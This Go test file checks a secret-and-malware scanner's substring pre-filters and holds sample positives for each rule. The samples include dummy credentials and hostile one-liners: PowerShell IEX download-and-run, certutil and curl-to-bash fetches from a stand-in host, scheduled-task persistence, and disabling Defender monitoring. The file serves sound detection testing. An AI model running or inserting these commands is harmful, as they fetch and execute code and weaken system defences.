package checks

import (
	"math/rand"
	"strings"
	"testing"
)

// TestContainsFoldMatchesReference checks the allocation-free case-insensitive
// search against the obvious-but-slow implementation, over random inputs.
func TestContainsFoldMatchesReference(t *testing.T) {
	reference := func(b []byte, lit string) bool {
		return strings.Contains(strings.ToLower(string(b)), lit)
	}

	alphabet := []byte("abcXYZ_-./0 \n")
	rng := rand.New(rand.NewSource(1))

	for i := 0; i < 4000; i++ {
		hay := make([]byte, rng.Intn(40))
		for j := range hay {
			hay[j] = alphabet[rng.Intn(len(alphabet))]
		}
		nlen := 1 + rng.Intn(4)
		needle := make([]byte, nlen)
		for j := range needle {
			needle[j] = alphabet[rng.Intn(len(alphabet))]
		}
		lit := strings.ToLower(string(needle))

		if got, want := containsFold(hay, lit), reference(hay, lit); got != want {
			t.Fatalf("containsFold(%q, %q) = %v, want %v", hay, lit, got, want)
		}
	}
}

func TestContainsFoldEdgeCases(t *testing.T) {
	cases := []struct {
		hay  string
		lit  string
		want bool
	}{
		{"", "x", false},
		{"abc", "", true},
		{"abc", "abcd", false},
		{"Set-MpPreference", "mppreference", true},
		{"SET-MPPREFERENCE", "mppreference", true},
		{"set-mppreference", "mppreference", true},
		{"AKIAXXXX", "akia", true},
		{"no match here", "akia", false},
		{"aaab", "ab", true}, // repeated first letter before the real match
		{"AAAB", "ab", true}, // same, upper case
		{"xyz", "z", true},   // match at the final position
	}
	for _, c := range cases {
		if got := containsFold([]byte(c.hay), c.lit); got != c.want {
			t.Errorf("containsFold(%q, %q) = %v, want %v", c.hay, c.lit, got, c.want)
		}
	}
}

// rulePositives is a sample per rule that the pattern genuinely matches.
// It exists to prove the pre-filters never reject something the regex would
// have caught.
var rulePositives = map[string]string{
	"SEC001": "id = " + awsKeyID,
	"SEC002": `aws_secret_access_key = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY123"`,
	"SEC003": "token: " + ghToken,
	"SEC004": "slack = " + slackToken,
	"SEC005": "url = https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXX",
	"SEC006": "key=" + stripeKey,
	"SEC007": "g = " + googleKey,
	"SEC008": "-----BEGIN RSA PRIVATE KEY-----",
	"SEC009": "sg = " + sendgridKey,
	"SEC010": "k = " + anthropicShort,
	"SEC011": "k = " + openaiKey,
	"SEC012": npmToken,
	"SEC013": `twilio_auth_token = "QWkq2mZx7LpR4vNc8TbWy1JdHs3GaE6u"`,
	"SEC014": "postgres://admin:Hunter2Trombone@db:5432/x",
	"SEC015": "t = " + jwt,
	"SEC016": `//registry.npmjs.org/:_authToken=QWkq2mZx7LpR4vNc8TbWy1JdHs3G`,
	"SEC017": `api_key = "QWkq2mZx7LpR4vNc8TbWy1JdHs3G"`,
	"SEC018": "PuTTY-User-Key-File-2: ssh-rsa",
	"MAL010": "powershell -enc SQBFAFgA",
	"MAL011": "$c = New-Object Net.WebClient; IEX $c.DownloadString('http://h/x')",
	"MAL012": "certutil -urlcache -split -f http://h/x.exe",
	"MAL013": "curl http://h/x.sh | bash",
	"MAL014": "eval(atob('ZG9Tb21ldGhpbmc='))",
	"MAL015": "schtasks /create /tn Updater /tr calc.exe",
	"MAL016": "Set-MpPreference -DisableRealtimeMonitoring $true",
}

// TestPrefiltersAcceptEveryKnownPositive is the safety net for the whole
// optimisation. A pre-filter that rejects content its pattern would have
// matched turns a detection into silence, which is the worst failure mode a
// scanner has. Every rule is checked, and every rule must have a sample.
func TestPrefiltersAcceptEveryKnownPositive(t *testing.T) {
	checked := map[string]bool{}

	for _, rule := range secretRules {
		sample, ok := rulePositives[rule.id]
		if !ok {
			t.Errorf("%s has no positive sample; add one so its pre-filter is verified", rule.id)
			continue
		}
		checked[rule.id] = true
		body := []byte(sample)

		if !rule.re.Match(body) {
			t.Errorf("%s: sample %q does not match its own pattern; the sample is wrong", rule.id, sample)
			continue
		}
		if !anyContainsFold(body, rule.prefilter) {
			t.Errorf("%s: pre-filter %v REJECTS %q, which the pattern matches -- this would silence the rule",
				rule.id, rule.prefilter, sample)
		}
	}

	for _, rule := range scriptRules {
		sample, ok := rulePositives[rule.id]
		if !ok {
			t.Errorf("%s has no positive sample; add one so its pre-filter is verified", rule.id)
			continue
		}
		checked[rule.id] = true
		body := []byte(sample)

		if !rule.re.Match(body) {
			t.Errorf("%s: sample %q does not match its own pattern; the sample is wrong", rule.id, sample)
			continue
		}
		if !anyContainsFold(body, rule.prefilter) {
			t.Errorf("%s: pre-filter %v REJECTS %q, which the pattern matches -- this would silence the rule",
				rule.id, rule.prefilter, sample)
		}
	}

	for id := range rulePositives {
		if !checked[id] {
			t.Errorf("sample for %s does not correspond to any rule", id)
		}
	}
}

// TestPrefilterLiteralsAreLowercase guards the containsFold contract: the
// literal must already be lowercase or the fold comparison never matches.
func TestPrefilterLiteralsAreLowercase(t *testing.T) {
	check := func(id string, lits []string) {
		for _, l := range lits {
			if l != strings.ToLower(l) {
				t.Errorf("%s pre-filter literal %q must be lowercase", id, l)
			}
			if l == "" {
				t.Errorf("%s has an empty pre-filter literal, which matches everything", id)
			}
		}
	}
	for _, r := range secretRules {
		check(r.id, r.prefilter)
	}
	for _, r := range scriptRules {
		check(r.id, r.prefilter)
	}
}
